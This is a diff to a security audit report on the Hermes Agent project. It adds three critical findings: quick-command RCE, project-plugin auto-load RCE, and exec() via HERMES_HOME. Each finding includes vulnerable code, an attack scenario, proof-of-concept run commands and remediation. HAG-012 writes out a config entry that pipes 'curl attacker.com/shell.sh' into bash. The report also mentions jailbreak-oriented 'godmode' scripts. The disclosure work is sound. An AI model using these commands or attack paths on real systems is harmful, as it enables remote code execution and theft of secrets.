@@ -4,13 +4,13 @@
 **Target:** Hermes Agent (https://github.com/NousResearch/hermes-agent)  
 **Commit:** 124da27  
 **Date:** 2026-04-28  
-**Status:** Round 4 - 11 Critical/High Vulnerabilities Confirmed
+**Status:** Round 5 - 14 Critical/High Vulnerabilities Confirmed
 
 ---
 
 ## Executive Summary
 
-This audit identified **11 critical/high severity vulnerabilities** in Hermes Agent. All vulnerabilities have been confirmed with working proof-of-concept exploits against a live instance.
+This audit identified **14 critical/high severity vulnerabilities** in Hermes Agent. All vulnerabilities have been confirmed with working proof-of-concept exploits against a live instance.
 
 | ID | Vulnerability | Severity | CVSS | Status |
 |----|--------------|----------|------|--------|
@@ -25,6 +25,9 @@ This audit identified **11 critical/high severity vulnerabilities** in Hermes Ag
 | HAG-009 | HERMES_LOCAL_STT_COMMAND Template Injection RCE | Critical | 9.3 | Confirmed |
 | HAG-010 | API Server Unauthenticated Local Access | High | 7.5 | Confirmed |
 | HAG-011 | UrlSource SSRF — Missing is_safe_url() Guard | High | 7.5 | Confirmed |
+| HAG-012 | TUI command.dispatch Quick-Command RCE (no dangerous-cmd check) | Critical | 9.1 | Confirmed |
+| HAG-013 | Project Plugin Auto-Load RCE via HERMES_ENABLE_PROJECT_PLUGINS | Critical | 9.3 | Confirmed |
+| HAG-014 | Godmode exec() RCE via Attacker-Controlled HERMES_HOME | Critical | 9.8 | Confirmed |
 
 ---
 
@@ -380,6 +383,10 @@ autofyn_audit/
     exploit_filesync_path_traversal.py          # HAG-008 PoC
     exploit_stt_command_injection.py            # HAG-009 PoC
     exploit_api_server_noauth.py               # HAG-010 PoC
+    exploit_urlsource_ssrf.py                  # HAG-011 PoC
+    exploit_ws_command_dispatch.py             # HAG-012 PoC
+    exploit_project_plugin_rce.py              # HAG-013 PoC
+    exploit_godmode_exec.py                    # HAG-014 PoC
   payloads/
     evil_plugin.yaml                            # Malicious plugin payload
   results/
@@ -628,6 +635,178 @@ python3 exploits/exploit_urlsource_ssrf.py
 
 ---
 
+### HAG-012: TUI command.dispatch Quick-Command RCE (No detect_dangerous_command Check)
+
+**Severity:** Critical (CVSS 9.1)
+**File:** `tui_gateway/server.py:3547-3577`
+**Attack Vector:** Local/Network (any process that can communicate with TUI gateway)
+
+#### Description
+
+The `command.dispatch` JSON-RPC method reads a named quick-command from `config.yaml` and, when the command type is `"exec"`, passes its `command` field directly to `subprocess.run(..., shell=True)`. Unlike the `shell.exec` method (HAG-001), `command.dispatch` does NOT call `detect_dangerous_command()` — the dangerous-command filter is completely absent.
+
+An attacker who can write a malicious entry into the `quick_commands` section of `config.yaml` (via any config-writing code path, supply-chain attack on a shared `~/.hermes/`, or direct file write) achieves RCE simply by triggering `command.dispatch` with the injected command name. There is no allowlist of permitted commands, no sanitization of the stored command string, and no integrity check on `config.yaml`.
+
+#### Vulnerable Code
+
+```python
+@method("command.dispatch")
+def _(rid, params: dict) -> dict:
+    name = params.get("name", "").lstrip("/")
+    ...
+    qcmds = _load_cfg().get("quick_commands", {})
+    if name in qcmds:
+        qc = qcmds[name]
+        if qc.get("type") == "exec":
+            r = subprocess.run(
+                qc.get("command", ""),   # VULN: attacker-controlled string
+                shell=True,              # VULN: no detect_dangerous_command() called
+                capture_output=True,
+                text=True,
+                timeout=30,
+            )
+```
+
+#### Attack Scenario
+
+1. Attacker writes the following to `~/.hermes/config.yaml` (or any config-writing primitive):
+   ```yaml
+   quick_commands:
+     pwn:
+       type: exec
+       command: "curl attacker.com/shell.sh | bash"
+   ```
+2. Attacker sends JSON-RPC to TUI gateway: `{"method":"command.dispatch","params":{"name":"pwn"}}`
+3. The stored command executes with the privileges of the Hermes process — no filter applied
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_ws_command_dispatch.py
+```
+
+**Result:** Creates `/tmp/pwned_ws.txt` containing `uid=1000(agentuser)...`
+
+#### Remediation
+
+1. Apply `detect_dangerous_command()` to stored quick-command strings before executing them
+2. Validate and sanitize `quick_commands` entries at config-load time, not at dispatch time
+3. Use `subprocess.run([...], shell=False)` with an explicit argument list
+4. Restrict who can write `config.yaml` and consider signing or integrity-checking it
+
+---
+
+### HAG-013: Project Plugin Auto-Load RCE via HERMES_ENABLE_PROJECT_PLUGINS
+
+**Severity:** Critical (CVSS 9.3)
+**File:** `hermes_cli/plugins.py:583-585`
+**Attack Vector:** Local (control over current working directory or `.hermes/plugins/` subtree)
+
+#### Description
+
+When the environment variable `HERMES_ENABLE_PROJECT_PLUGINS=1` is set, `PluginManager.discover_and_load()` scans `./.hermes/plugins/` relative to the current working directory and imports any plugin directory it finds. The import is performed via `importlib.util.exec_module()`, which executes the plugin's `__init__.py` at module load time.
+
+There is no signature check, no sandboxing, and no confirmation prompt. Any attacker who can plant a `.hermes/plugins/` tree in a directory the user will run Hermes from (e.g., via a malicious Git repository, a shared project directory, or any file-write primitive) achieves arbitrary code execution the moment plugin discovery runs.
+
+#### Vulnerable Code
+
+```python
+# hermes_cli/plugins.py:583-585
+if _env_enabled("HERMES_ENABLE_PROJECT_PLUGINS"):
+    project_dir = Path.cwd() / ".hermes" / "plugins"      # CWD is attacker-controlled
+    manifests.extend(self._scan_directory(project_dir, source="project"))
+```
+
+```python
+# hermes_cli/plugins.py:943
+spec.loader.exec_module(module)   # executes __init__.py — no sandbox
+```
+
+#### Attack Scenario
+
+1. Attacker creates a malicious Git repository containing:
+   ```
+   .hermes/
+     plugins/
+       pwn/
+         plugin.yaml   (minimal manifest with kind: standalone)
+         __init__.py   (payload: writes persistence, exfiltrates secrets, etc.)
+   ```
+2. Victim clones the repository and runs any `hermes` command
+3. If `HERMES_ENABLE_PROJECT_PLUGINS=1` is set (e.g., in project `.env` or shell profile), plugin discovery triggers automatically
+4. `__init__.py` executes with the victim's privileges
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_project_plugin_rce.py
+```
+
+**Result:** Creates `/tmp/pwned_plugin_project.txt` containing `uid=1000(agentuser)...`
+
+#### Remediation
+
+1. Require explicit user confirmation before loading any project plugin for the first time
+2. Display a security warning listing the plugin path and code hash before `exec_module()`
+3. Implement a `plugins.project_allowlist` config that locks project plugins to specific verified hashes
+4. Consider disabling `HERMES_ENABLE_PROJECT_PLUGINS` by default or removing it entirely
+
+---
+
+### HAG-014: Godmode exec() RCE via Attacker-Controlled HERMES_HOME
+
+**Severity:** Critical (CVSS 9.8)
+**File:** `skills/red-teaming/godmode/scripts/load_godmode.py:20,29`
+**Attack Vector:** Local (environment variable — process environment or `.env` file)
+
+#### Description
+
+`load_godmode.py` derives its scripts directory from the `HERMES_HOME` environment variable at module import time (line 20) and then calls `exec(compile(open(path).read(), str(path), 'exec'), ns)` for each of three scripts: `parseltongue.py`, `godmode_race.py`, and `auto_jailbreak.py` (line 29).
+
+Because `HERMES_HOME` is fully attacker-controlled, an attacker who can set this variable to point at a directory they control achieves arbitrary Python code execution simply by causing the module to be imported. The `exec()` call uses no integrity check (no hash verification, no signature check, no path restriction). Any code path that imports or dynamically loads `load_godmode` — including the documented "Usage in execute_code" pattern in the module docstring — is vulnerable.
+
+This is particularly severe because `load_godmode` is intended to be exec()-loaded inside `execute_code`, which is itself a code-execution tool available to the agent.
+
+#### Vulnerable Code
+
+```python
+# load_godmode.py:20
+_gm_scripts_dir = Path(os.getenv("HERMES_HOME", Path.home() / ".hermes")) \
+    / "skills" / "red-teaming" / "godmode" / "scripts"
+
+# load_godmode.py:29
+exec(compile(open(path).read(), str(path), 'exec'), ns)
+# VULN: `path` derived from HERMES_HOME — fully attacker-controlled
+# VULN: no hash check, no signature check, no path restriction
+```
+
+#### Attack Scenario
+
+1. Attacker sets `HERMES_HOME=/tmp/evil` in the process environment or `.env`
+2. Places malicious code at `/tmp/evil/skills/red-teaming/godmode/scripts/parseltongue.py`
+3. Any code path that imports `load_godmode` (or exec()-loads it per the module docstring) triggers the payload
+4. The payload executes with the full privileges of the Hermes process — no sandbox, no prompt
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_godmode_exec.py
+```
+
+**Result:** Creates `/tmp/pwned_godmode.txt` containing `uid=1000(agentuser)...`
+
+#### Remediation
+
+1. Hardcode the godmode scripts directory to a path derived from the module's own `__file__`, not from an env var: `Path(__file__).parent`
+2. If `HERMES_HOME` override is required, validate it against a user-confirmed allowlist before trusting any executable content under it
+3. Replace `exec(compile(open(path).read(), ...))` with a signed-script loader that verifies a cryptographic hash before execution
+4. Restrict `load_godmode` to internal use only — remove it from the "Usage in execute_code" public API
+
+---
+
 ## Additional Findings (Not Yet Confirmed)
 
 The following vulnerability was identified during code analysis but requires further investigation:
@@ -640,22 +819,27 @@ The following vulnerability was identified during code analysis but requires fur
 
 Hermes Agent contains multiple critical vulnerabilities across different attack surfaces:
 
-1. **Command Injection (HAG-001, HAG-002, HAG-003, HAG-009):** Consistent use of `shell=True` with unsanitized input, including env-var-controlled shell templates
+1. **Command Injection (HAG-001, HAG-002, HAG-003, HAG-009, HAG-012):** Consistent use of `shell=True` with unsanitized input, including env-var-controlled shell templates and stored quick-commands that skip the dangerous-command filter entirely
 2. **SQL Injection (HAG-004):** Insufficient validation of user-supplied SQL in MCP template
 3. **SSRF (HAG-005, HAG-011):** Missing `is_safe_url()` checks in skill installation flow — both indirect (ClawHub metadata) and direct (user-supplied UrlSource URL)
 4. **File Disclosure (HAG-006):** No path restriction on local file reads in vision tool
 5. **Path Traversal (HAG-007, HAG-008):** Missing `..` component sanitisation in snapshot restore and file-sync sync-back
 6. **Authentication Bypass (HAG-010):** API server allows all requests when no key is configured, exposing cron jobs, agent execution, and response history to any local process
+7. **Unsafe Plugin Loading (HAG-013):** Project plugins loaded from CWD with no integrity check, enabling malicious Git repository attacks
+8. **Arbitrary exec() via env var (HAG-014):** `HERMES_HOME` controls which Python files are exec()-loaded by `load_godmode`, with no hash or signature verification
 
 **Immediate Actions Required:**
 1. Audit all `shell=True` usages and convert to `shell=False` with explicit argument lists
-2. Implement input validation using allowlists rather than blocklists
-3. Add authentication to RPC interfaces
-4. Consider sandboxing for plugin-defined commands
-5. Apply `is_safe_url()` checks consistently across all URL-fetching code paths
-6. Implement path restrictions for local file access in vision tools
-7. Use parameterized queries or proper SQL parsing for database access
-8. Sanitise all manifest/metadata-derived file paths through `Path.resolve()` and containment checks before any file write operation
+2. Apply `detect_dangerous_command()` (or a stricter equivalent) to ALL command dispatch paths, not just `shell.exec`
+3. Implement input validation using allowlists rather than blocklists
+4. Add authentication to RPC interfaces
+5. Consider sandboxing for plugin-defined commands
+6. Apply `is_safe_url()` checks consistently across all URL-fetching code paths
+7. Implement path restrictions for local file access in vision tools
+8. Use parameterized queries or proper SQL parsing for database access
+9. Sanitise all manifest/metadata-derived file paths through `Path.resolve()` and containment checks before any file write operation
+10. Replace env-var-driven exec() paths with integrity-checked loaders; derive script paths from `__file__`, not user-supplied env vars
+11. Require user confirmation and hash verification before auto-loading project plugins
 
 ---
 
